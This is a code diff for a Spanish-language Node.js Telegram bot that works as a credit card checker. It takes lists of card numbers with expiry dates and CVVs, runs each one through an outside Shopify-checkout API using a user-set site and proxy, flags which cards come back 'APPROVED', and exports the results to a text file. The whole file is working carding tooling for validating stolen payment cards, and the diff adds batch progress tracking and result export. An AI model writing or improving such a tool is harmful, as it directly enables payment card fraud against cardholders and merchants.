@@ -1,8 +1,10 @@
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
+const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
+const OWNER_ID = Number(process.env.OWNER_ID);
 const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
 
 if (!BOT_TOKEN) {
@@ -12,67 +14,96 @@ if (!BOT_TOKEN) {
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// memoria simple por chat
-const config = {}; // chatId => { site, proxy }
+/* ================== DATA ================== */
+const DATA_FILE = './data.json';
+let data = {};
 
-/* ================= START ================= */
+if (fs.existsSync(DATA_FILE)) {
+  data = JSON.parse(fs.readFileSync(DATA_FILE));
+} else {
+  fs.writeFileSync(DATA_FILE, JSON.stringify({}, null, 2));
+}
+
+function saveData() {
+  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+}
+
+function isOwner(id) {
+  return id === OWNER_ID;
+}
+
+/* ================== RUNTIME ================== */
+const running = {}; // chatId => true/false
+
+/* ================== START ================== */
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
 `🤖 Bot activo
 
-Configura primero:
+Configura:
 • /setsite https://site.com
 • /setproxy ip:port:user:pass
 
-Luego usa:
-• /chk cc|mm|yy|cvv
-• varios CC (uno por línea)`
+Usa:
+• /chk cc|mm|yy|cvv (uno o varios)
+• /stop
+
+ℹ️ Se muestra progreso y se exporta TXT`
   );
 });
 
-/* ================= SET SITE ================= */
+/* ================== CONFIG ================== */
 bot.onText(/\/setsite (.+)/, (msg, match) => {
-  const chatId = msg.chat.id;
-  config[chatId] = config[chatId] || {};
-  config[chatId].site = match[1].trim();
-
-  bot.sendMessage(chatId, `✅ Site guardado:\n${config[chatId].site}`);
+  const id = msg.chat.id;
+  data[id] = data[id] || {};
+  data[id].site = match[1].trim();
+  saveData();
+  bot.sendMessage(id, `✅ Site guardado`);
 });
 
-/* ================= SET PROXY ================= */
 bot.onText(/\/setproxy (.+)/, (msg, match) => {
-  const chatId = msg.chat.id;
-  config[chatId] = config[chatId] || {};
-  config[chatId].proxy = match[1].trim();
-
-  bot.sendMessage(chatId, `✅ Proxy guardado`);
+  const id = msg.chat.id;
+  data[id] = data[id] || {};
+  data[id].proxy = match[1].trim();
+  saveData();
+  bot.sendMessage(id, `✅ Proxy guardado`);
 });
 
-/* ================= CHK ================= */
+/* ================== STOP ================== */
+bot.onText(/\/stop/, (msg) => {
+  running[msg.chat.id] = false;
+  bot.sendMessage(msg.chat.id, '🛑 Proceso detenido');
+});
+
+/* ================== CHK ================== */
 bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
   const chatId = msg.chat.id;
-  const conf = config[chatId];
+  const conf = data[chatId];
 
   if (!conf || !conf.site || !conf.proxy) {
-    return bot.sendMessage(
-      chatId,
-      '❌ Falta configuración\nUsa /setsite y /setproxy'
-    );
+    return bot.sendMessage(chatId, '❌ Usa /setsite y /setproxy primero');
   }
 
-  let input = match[1].trim();
-  if (!input) {
-    return bot.sendMessage(chatId, '❌ No enviaste CC');
-  }
+  const input = match[1].trim();
+  if (!input) return bot.sendMessage(chatId, '❌ No enviaste datos');
 
   const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
 
-  bot.sendMessage(chatId, `⏳ Procesando ${ccs.length} check(s)...`);
+  running[chatId] = true;
+
+  let ok = 0, bad = 0, err = 0;
+  let results = [];
+
+  const progressMsg = await bot.sendMessage(
+    chatId,
+    `⏳ Iniciando...\nTotal: ${ccs.length}`
+  );
 
   for (let i = 0; i < ccs.length; i++) {
-    const cc = ccs[i];
+    if (!running[chatId]) break;
 
+    const cc = ccs[i];
     const url =
       `${API_BASE}?site=${encodeURIComponent(conf.site)}` +
       `&cc=${encodeURIComponent(cc)}` +
@@ -82,19 +113,50 @@ bot.onText(/\/chk([\s\S]*)/, async (msg, match) => {
       const res = await axios.get(url, { timeout: 30000 });
       const d = res.data;
 
-      const msgTxt =
-        `━━━━━━━━━━━━━━\n` +
-        `🧪 CHK ${i + 1}\n` +
-        `💳 ${cc}\n` +
-        `🏪 ${d.Gateway}\n` +
-        `💰 ${d.Price}\n` +
-        `📤 ${d.Response}`;
+      let status = 'DECLINED ❌';
+      if (String(d.Response).toUpperCase().includes('APPRO')) {
+        status = 'APPROVED ✅';
+        ok++;
+        bot.sendMessage(
+          chatId,
+`━━━━━━━━━━━━━━
+💳 ${cc}
+🏪 ${d.Gateway}
+💰 ${d.Price}
+✅ APPROVED`
+        );
+      } else {
+        bad++;
+      }
 
-      bot.sendMessage(chatId, msgTxt);
+      results.push(`${cc} | ${status} | ${d.Response}`);
     } catch (e) {
-      bot.sendMessage(chatId, `❌ Error en CHK ${i + 1}`);
+      err++;
+      results.push(`${cc} | ERROR`);
     }
+
+    await bot.editMessageText(
+      `⏳ Progreso ${i + 1}/${ccs.length}
+✅ ${ok} ❌ ${bad} ⚠️ ${err}`,
+      { chat_id: chatId, message_id: progressMsg.message_id }
+    );
   }
+
+  running[chatId] = false;
+
+  const file = `result_${Date.now()}.txt`;
+  fs.writeFileSync(file, results.join('\n'));
+
+  await bot.sendDocument(chatId, file);
+  fs.unlinkSync(file);
+
+  bot.sendMessage(
+    chatId,
+`✅ Finalizado
+Aprobadas: ${ok}
+Declinadas: ${bad}
+Errores: ${err}`
+  );
 });
 
 console.log('🤖 Bot iniciado correctamente');
